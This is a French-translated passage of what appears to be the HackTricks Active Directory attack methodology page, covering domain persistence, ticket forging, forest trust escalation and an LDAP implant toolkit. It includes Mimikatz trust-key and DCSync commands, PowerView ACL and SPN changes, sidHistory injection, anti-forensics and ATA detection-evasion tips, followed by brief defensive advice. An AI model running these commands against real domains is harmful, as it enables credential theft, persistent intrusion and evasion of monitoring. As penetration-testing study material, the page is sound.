ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Si des **vulnerable templates** sont configurés, il est possible de les abuser pour escalader des privilèges :


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Une fois que vous obtenez des privilèges **Domain Admin** ou, mieux, **Enterprise Admin**, vous pouvez **dump** la **base de données du domaine** : _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Certaines des techniques discutées précédemment peuvent être utilisées pour la persistence.\
Par exemple vous pourriez :

- Make users vulnerable to [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Make users vulnerable to [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Grant [**DCSync**](#dcsync) privileges to a user

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

The **Silver Ticket attack** crée un **Ticket Granting Service (TGS) ticket** légitime pour un service spécifique en utilisant le **NTLM hash** (par exemple, le **hash du compte PC**). Cette méthode est employée pour **access the service privileges**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Une **Golden Ticket attack** implique qu'un attaquant obtienne le **NTLM hash du compte krbtgt** dans un environnement Active Directory (AD). Ce compte est spécial car il est utilisé pour signer tous les **Ticket Granting Tickets (TGTs)**, qui sont essentiels pour l'authentification au sein du réseau AD.

Une fois que l'attaquant obtient ce hash, il peut créer des **TGTs** pour n'importe quel compte qu'il choisit (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Ce sont comme des golden tickets forgés d'une manière qui **bypass les mécanismes courants de détection des golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Avoir les certificats d'un compte ou être capable de les demander** est un très bon moyen de persister dans le compte de l'utilisateur (même s'il change le mot de passe) :


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Utiliser des certificats permet aussi de persister avec des privilèges élevés à l'intérieur du domaine :**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

L'objet **AdminSDHolder** dans Active Directory assure la sécurité des **groupes privilégiés** (comme Domain Admins et Enterprise Admins) en appliquant une **Access Control List (ACL)** standard sur ces groupes pour empêcher les modifications non autorisées. Cependant, cette fonctionnalité peut être exploitée ; si un attaquant modifie l'ACL d'AdminSDHolder pour donner un accès complet à un utilisateur ordinaire, cet utilisateur obtient un contrôle étendu sur tous les groupes privilégiés. Cette mesure de sécurité, censée protéger, peut ainsi se retourner contre son but et permettre un accès indésirable si elle n'est pas étroitement surveillée.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Dans chaque **Domain Controller (DC)**, il existe un compte **local administrator**. En obtenant des droits admin sur une telle machine, le hash de l'Administrator local peut être extrait en utilisant **mimikatz**. Ensuite, une modification du registre est nécessaire pour **enable the use of this password**, permettant un accès distant au compte Administrator local.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Vous pourriez **donner** des **permissions spéciales** à un **utilisateur** sur certains objets du domaine qui permettront à l'utilisateur **d'escalader des privilèges à l'avenir**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Les **security descriptors** sont utilisés pour **stocker** les **permissions** qu'un **objet** possède **sur** un **objet**. Si vous pouvez juste **faire** un **petit changement** dans le **security descriptor** d'un objet, vous pouvez obtenir des privilèges très intéressants sur cet objet sans avoir besoin d'être membre d'un groupe privilégié.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Abusez de la classe auxiliaire `dynamicObject` pour créer des principals/GPO/DNS courts de vie avec `entryTTL`/`msDS-Entry-Time-To-Die` ; ils s'auto-suppriment sans tombstones, effaçant les preuves LDAP tout en laissant des SIDs orphelins, des références `gPLink` cassées, ou des réponses DNS en cache (par ex., AdminSDHolder ACE pollution ou des redirections malveillantes `gPCFileSysPath`/AD-integrated DNS).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Altérer **LSASS** en mémoire pour établir un **mot de passe universel**, donnant accès à tous les comptes du domaine.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Vous pouvez créer votre **propre SSP** pour **capture** en **clear text** les **credentials** utilisés pour accéder à la machine.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Il enregistre un **nouveau Domain Controller** dans l'AD et l'utilise pour **push attributes** (SIDHistory, SPNs...) sur des objets spécifiés **sans** laisser de **logs** concernant les **modifications**. Vous **need DA** privileges et devez être dans le **root domain**.\
Notez que si vous utilisez de mauvaises données, des logs assez moches apparaîtront.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Précédemment nous avons abordé comment escalader des privilèges si vous avez **enough permission to read LAPS passwords**. Cependant, ces mots de passe peuvent aussi être utilisés pour **maintain persistence**.\
Voir :


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft considère la **Forest** comme la frontière de sécurité. Cela implique que **compromettre un seul domaine pourrait potentiellement conduire à la compromission de toute la Forest**.

### Basic Information

Un [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) est un mécanisme de sécurité qui permet à un utilisateur d'un **domaine** d'accéder aux ressources d'un autre **domaine**. Il crée essentiellement un lien entre les systèmes d'authentification des deux domaines, permettant aux vérifications d'authentification de circuler de façon transparente. Lorsque des domaines établissent une trust, ils échangent et conservent des **keys** spécifiques au sein de leurs **Domain Controllers (DCs)**, qui sont cruciales pour l'intégrité de la trust.

Dans un scénario typique, si un utilisateur veut accéder à un service dans un **domaine de confiance**, il doit d'abord demander un ticket spécial connu sous le nom de **inter-realm TGT** depuis le DC de son propre domaine. Ce TGT est chiffré avec une **trust key** partagée que les deux domaines ont convenue. L'utilisateur présente ensuite ce TGT au **DC du domaine de confiance** pour obtenir un ticket de service (**TGS**). Après validation réussie de l'inter-realm TGT par le DC du domaine de confiance, il émet un TGS, donnant à l'utilisateur l'accès au service.

**Étapes** :

1. Un **client computer** dans le **Domain 1** commence le processus en utilisant son **NTLM hash** pour demander un **Ticket Granting Ticket (TGT)** à son **Domain Controller (DC1)**.
2. DC1 émet un nouveau TGT si le client est authentifié avec succès.
3. Le client demande ensuite un **inter-realm TGT** à DC1, qui est nécessaire pour accéder aux ressources dans le **Domain 2**.
4. L'inter-realm TGT est chiffré avec une **trust key** partagée entre DC1 et DC2 dans le cadre de la confiance bidirectionnelle.
5. Le client apporte l'inter-realm TGT au **Domain Controller (DC2)** du Domain 2.
6. DC2 vérifie l'inter-realm TGT en utilisant sa trust key partagée et, si valide, émet un **Ticket Granting Service (TGS)** pour le serveur dans le Domain 2 auquel le client souhaite accéder.
7. Enfin, le client présente ce TGS au serveur, qui est chiffré avec le hash du compte du serveur, pour obtenir l'accès au service dans le Domain 2.

### Different trusts

Il est important de noter qu'**une trust peut être à sens unique ou bidirectionnelle**. Dans l'option à 2 sens, les deux domaines se feront mutuellement confiance, mais dans la relation de trust **1 way** l'un des domaines sera le **trusted** et l'autre le **trusting**. Dans ce dernier cas, **vous ne pourrez accéder qu'aux ressources à l'intérieur du trusting domain depuis le trusted**.

Si le Domain A trust le Domain B, A est le trusting domain et B est le trusted. De plus, dans le **Domain A**, il s'agira d'une **Outbound trust** ; et dans le **Domain B**, ce sera une **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: C'est une configuration courante au sein de la même forest, où un child domain a automatiquement une two-way transitive trust avec son parent. Essentiellement, cela signifie que les requêtes d'authentification peuvent circuler de manière transparente entre le parent et l'enfant.
- **Cross-link Trusts**: Appelées "shortcut trusts", elles sont établies entre des child domains pour accélérer les processus de referral. Dans des forests complexes, les referrals d'authentification doivent typiquement voyager jusqu'à la racine de la forest puis redescendre vers le domaine cible. En créant des cross-links, le trajet est raccourci, ce qui est particulièrement bénéfique dans des environnements géographiquement dispersés.
- **External Trusts**: Celles-ci sont configurées entre des domaines différents et non liés et sont non-transitives par nature. Selon la documentation de [Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), les external trusts sont utiles pour accéder aux ressources d'un domaine en dehors de la forest courante qui n'est pas connecté par une forest trust. La sécurité est renforcée via le SID filtering avec les external trusts.
- **Tree-root Trusts**: Ces trusts sont automatiquement établies entre le forest root domain et un tree root nouvellement ajouté. Bien que rarement rencontrées, les tree-root trusts sont importantes pour ajouter de nouveaux arbres de domaine à une forest, leur permettant de conserver un nom de domaine unique et en assurant la transitivité bidirectionnelle. Plus d'informations sont disponibles dans le guide de [Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Ce type de trust est une two-way transitive trust entre deux forest root domains, en appliquant également le SID filtering pour renforcer les mesures de sécurité.
- **MIT Trusts**: Ces trusts sont établies avec des domaines Kerberos non-Windows conformes à [RFC4120](https://tools.ietf.org/html/rfc4120). Les MIT trusts sont un peu plus spécialisées et s'adressent aux environnements nécessitant une intégration avec des systèmes Kerberos en dehors de l'écosystème Windows.

#### Other differences in **trusting relationships**

- Une relation de trust peut aussi être **transitive** (A trust B, B trust C, alors A trust C) ou **non-transitive**.
- Une relation de trust peut être configurée comme une **bidirectional trust** (les deux se font confiance) ou comme une **one-way trust** (seul l'un d'eux fait confiance à l'autre).

### Attack Path

1. **Enumerate** les relations de trust
2. Vérifiez si un **security principal** (user/group/computer) a **access** aux ressources de **l'autre domaine**, peut-être via des entrées ACE ou en faisant partie de groupes de l'autre domaine. Cherchez des **relationships across domains** (la trust a probablement été créée pour cela).
1. kerberoast dans ce cas pourrait être une autre option.
3. **Compromise** les **accounts** qui peuvent **pivot** entre les domaines.

Les attaquants peuvent accéder aux ressources d'un autre domaine via trois mécanismes principaux :

- **Local Group Membership**: Des principals peuvent être ajoutés aux groupes locaux sur des machines, tels que le groupe “Administrators” sur un serveur, leur accordant un contrôle significatif sur cette machine.
- **Foreign Domain Group Membership**: Des principals peuvent aussi être membres de groupes au sein du domaine étranger. Cependant, l'efficacité de cette méthode dépend de la nature de la trust et de la portée du groupe.
- **Access Control Lists (ACLs)**: Des principals peuvent être spécifiés dans une **ACL**, particulièrement en tant qu'entités dans des **ACEs** au sein d'une **DACL**, leur fournissant l'accès à des ressources spécifiques. Pour ceux qui souhaitent approfondir la mécanique des ACLs, DACLs et ACEs, le whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” est une ressource inestimable.

### Find external users/groups with permissions

Vous pouvez vérifier **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** pour trouver les ForeignSecurityPrincipals dans le domaine. Ceux-ci seront des user/group provenant d'**un domaine/forêt externe**.

Vous pouvez vérifier cela dans **Bloodhound** ou en utilisant powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Escalade de privilèges de forêt Child-to-Parent
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Autres façons d'énumérer les trusts de domaine:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Il existe **2 clés de confiance**, une pour _Child --> Parent_ et une autre pour _Parent_ --> _Child_.\
> Vous pouvez trouver celle utilisée par le domaine courant avec :
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escalader au niveau Enterprise admin vers le domaine child/parent en abusant de la trust avec SID-History injection :


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Comprendre comment le Configuration Naming Context (NC) peut être exploité est crucial. Le Configuration NC sert de dépôt central pour les données de configuration à travers une forêt dans les environnements Active Directory (AD). Ces données sont répliquées vers chaque Domain Controller (DC) au sein de la forêt, les DC en écriture conservant une copie modifiable du Configuration NC. Pour exploiter ceci, il faut avoir **les privilèges SYSTEM sur un DC**, de préférence un child DC.

**Link GPO to root DC site**

Le container Sites du Configuration NC contient des informations sur les sites de tous les ordinateurs joints au domaine dans la forêt AD. En opérant avec des privilèges SYSTEM sur n'importe quel DC, un attaquant peut lier des GPOs aux sites root DC. Cette action peut potentiellement compromettre le domaine racine en manipulant les politiques appliquées à ces sites.

Pour plus d'informations, consultez la recherche sur [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Un vecteur d'attaque consiste à cibler des gMSA privilégiés au sein du domaine. La KDS Root key, essentielle pour calculer les mots de passe des gMSA, est stockée dans le Configuration NC. Avec des privilèges SYSTEM sur n'importe quel DC, il est possible d'accéder à la KDS Root key et de calculer les mots de passe de n'importe quel gMSA dans la forêt.

Une analyse détaillée et un guide pas à pas se trouvent dans :


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Attaque complémentaire MSA déléguée (BadSuccessor – abus des attributs de migration) :


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Recherche externe supplémentaire : [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Cette méthode nécessite de la patience, en attendant la création de nouveaux objets AD privilégiés. Avec des privilèges SYSTEM, un attaquant peut modifier le AD Schema pour accorder à n'importe quel utilisateur le contrôle total sur toutes les classes. Cela peut conduire à un accès non autorisé et au contrôle des objets AD nouvellement créés.

Pour en savoir plus, voir [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

La vulnérabilité ADCS ESC5 vise le contrôle des objets Public Key Infrastructure (PKI) pour créer un template de certificat permettant de s'authentifier en tant que n'importe quel utilisateur au sein de la forêt. Comme les objets PKI résident dans le Configuration NC, la compromission d'un child DC en écriture permet l'exécution d'attaques ESC5.

Pour plus de détails, voir [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). Dans les scénarios sans ADCS, l'attaquant peut mettre en place les composants nécessaires, comme discuté dans [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### Domaine de forêt externe – unidirectionnel (Inbound) ou bidirectionnel
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Dans ce scénario **votre domaine est approuvé par** un domaine externe, ce qui vous donne **des permissions indéterminées** sur celui-ci. Vous devrez découvrir **quels principals de votre domaine ont quels accès sur le domaine externe** puis essayer de les exploiter :


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Domaine de forêt externe - Unidirectionnel (sortant)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Dans ce scénario **votre domaine** accorde **des privilèges** à un principal d'**un autre domaine**.

Cependant, lorsqu'un **domaine est de confiance** pour le domaine qui fait confiance, le domaine de confiance **crée un utilisateur** avec un **nom prévisible** qui utilise comme **mot de passe le mot de passe de la relation de confiance**. Cela signifie qu'il est possible de **prendre le compte d'un utilisateur du domaine qui accorde la confiance pour pénétrer dans le domaine de confiance** afin de l'énumérer et d'essayer d'escalader davantage de privilèges :


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Une autre façon de compromettre le domaine de confiance est de trouver un [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) créé dans la **direction opposée** de la relation de confiance (ce qui n'est pas très courant).

Une autre façon de compromettre le domaine de confiance est d'attendre sur une machine où un **utilisateur du domaine de confiance peut se connecter** via **RDP**. Ensuite, l'attaquant pourrait injecter du code dans le processus de la session RDP et **accéder au domaine d'origine de la victime** depuis là. De plus, si la **victime a monté son disque dur**, depuis le processus de **session RDP** l'attaquant pourrait déposer des **backdoors** dans le **dossier de démarrage du disque dur**. Cette technique s'appelle **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Atténuation des abus liés aux relations de confiance entre domaines

### **SID Filtering:**

- Le risque d'attaques exploitant l'attribut SIDHistory à travers des relations de confiance entre forêts est atténué par SID Filtering, qui est activé par défaut sur toutes les relations de confiance inter-forêts. Cela repose sur l'hypothèse que les relations de confiance intra-forêt sont sûres, considérant la forêt, plutôt que le domaine, comme la frontière de sécurité selon la position de Microsoft.
- Toutefois, il y a un revers : SID Filtering peut perturber des applications et l'accès des utilisateurs, ce qui conduit parfois à sa désactivation.

### **Selective Authentication:**

- Pour les relations de confiance inter-forêts, utiliser Selective Authentication garantit que les utilisateurs des deux forêts ne sont pas automatiquement authentifiés. À la place, des permissions explicites sont requises pour que des utilisateurs accèdent aux domaines et serveurs au sein du domaine ou de la forêt qui accorde la confiance.
- Il est important de noter que ces mesures ne protègent pas contre l'exploitation du writable Configuration Naming Context (NC) ni contre les attaques sur le compte de confiance.

[**Plus d'informations sur les domain trusts sur ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## Abus d'AD via LDAP depuis des implants sur l'hôte

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) réimplémente les primitives LDAP de type bloodyAD en tant que x64 Beacon Object Files qui s'exécutent entièrement à l'intérieur d'un implant sur l'hôte (par ex., Adaptix C2). Les opérateurs compilent le pack avec `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, chargent `ldap.axs`, puis appellent `ldap <subcommand>` depuis le beacon. Tout le trafic utilise le contexte de sécurité du logon courant sur LDAP (389) avec signing/sealing ou LDAPS (636) avec auto certificate trust, donc aucun proxy socks ni artefact disque n'est requis.

### Énumération LDAP côté implant

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, et `get-groupmembers` résolvent les noms courts/chemins d'OU en DN complets et affichent les objets correspondants.
- `get-object`, `get-attribute`, et `get-domaininfo` récupèrent des attributs arbitraires (y compris les descripteurs de sécurité) ainsi que les métadonnées de forêt/domaine depuis `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, et `get-rbcd` exposent les roasting candidates, les paramètres de délégation, et les descripteurs existants de [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) directement depuis LDAP.
- `get-acl` et `get-writable --detailed` analysent la DACL pour lister les trustees, les droits (GenericAll/WriteDACL/WriteOwner/attribute writes) et l'héritage, fournissant des cibles immédiates pour l'escalade de privilèges via les ACL.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### Primitives d'écriture LDAP pour l'escalade et la persistance

- Les BOFs de création d'objets (`add-user`, `add-computer`, `add-group`, `add-ou`) permettent à l'opérateur de préparer de nouveaux principals ou comptes machine là où des droits sur les OU existent. `add-groupmember`, `set-password`, `add-attribute`, et `set-attribute` détournent directement des cibles dès que des droits write-property sont trouvés.
- Les commandes focalisées sur les ACL telles que `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, et `add-dcsync` traduisent WriteDACL/WriteOwner sur n'importe quel objet AD en réinitialisations de mot de passe, contrôle des memberships de groupe, ou privilèges DCSync sans laisser d'artefacts PowerShell/ADSI. Les homologues `remove-*` nettoient les ACE injectées.

### Délégation, roasting, et abus de Kerberos

- `add-spn`/`set-spn` rendent instantanément un user compromis Kerberoastable ; `add-asreproastable` (toggle UAC) le marque pour AS-REP roasting sans toucher au mot de passe.
- Les macros de délégation (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) réécrivent `msDS-AllowedToDelegateTo`, les flags UAC, ou `msDS-AllowedToActOnBehalfOfOtherIdentity` depuis le beacon, activant des chemins d'attaque constrained/unconstrained/RBCD et éliminant le besoin de PowerShell distant ou RSAT.

### Injection sidHistory, déplacement d'OU, et modelage de la surface d'attaque

- `add-sidhistory` injecte des SIDs privilégiés dans le SID history d'un principal contrôlé (voir [SID-History Injection](sid-history-injection.md)), fournissant une héritage d'accès furtif entièrement via LDAP/LDAPS.
- `move-object` change le DN/OU des computers ou users, permettant à un attaquant de déplacer des actifs dans des OU où des droits délégués existent déjà avant d'abuser de `set-password`, `add-groupmember`, ou `add-spn`.
- Des commandes de suppression strictement ciblées (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, etc.) autorisent un rollback rapide après que l'opérateur a récolté des credentials ou établi de la persistance, minimisant la télémétrie.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Quelques défenses générales

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Mesures défensives pour la protection des identifiants**

- **Domain Admins Restrictions** : Il est recommandé que les Domain Admins ne soient autorisés à se connecter que sur les Domain Controllers, en évitant leur utilisation sur d'autres hôtes.
- **Service Account Privileges** : Les services ne devraient pas être exécutés avec des privilèges Domain Admin (DA) pour maintenir la sécurité.
- **Temporal Privilege Limitation** : Pour les tâches nécessitant des privilèges DA, leur durée devrait être limitée. Cela peut être réalisé par : `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation** : Auditer les Event IDs 2889/3074/3075 puis appliquer LDAP signing plus LDAPS channel binding sur les DCs/clients pour bloquer les tentatives MITM/relay LDAP.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Mise en œuvre de techniques de leurre**

- La mise en œuvre de deception consiste à poser des pièges, comme des utilisateurs ou ordinateurs leurres, avec des caractéristiques telles que des mots de passe qui n'expirent pas ou marqués Trusted for Delegation. Une approche détaillée inclut la création d'utilisateurs avec des droits spécifiques ou leur ajout à des groupes à haut privilège.
- Un exemple concret utilise des outils tels que : `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Plus d'informations sur le déploiement de techniques de leurre se trouvent sur [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifier les leurres**

- **Pour les objets User** : Les indicateurs suspects incluent un ObjectSID atypique, des logons peu fréquents, des dates de création, et un faible nombre d'échecs de mot de passe.
- **Indicateurs généraux** : Comparer les attributs d'objets potentiellement leurres avec ceux d'objets réels peut révéler des incohérences. Des outils comme [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) peuvent aider à identifier ces leurres.

### **Contourner les systèmes de détection**

- **Microsoft ATA Detection Bypass** :
- **User Enumeration** : Éviter l'énumération de sessions sur les Domain Controllers pour prévenir la détection par ATA.
- **Ticket Impersonation** : Utiliser des clés **aes** pour la création de tickets aide à échapper à la détection en évitant de rétrograder vers NTLM.
- **DCSync Attacks** : Il est conseillé d'exécuter depuis un hôte non-Domain Controller pour éviter la détection par ATA, car une exécution directe depuis un Domain Controller déclenchera des alertes.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
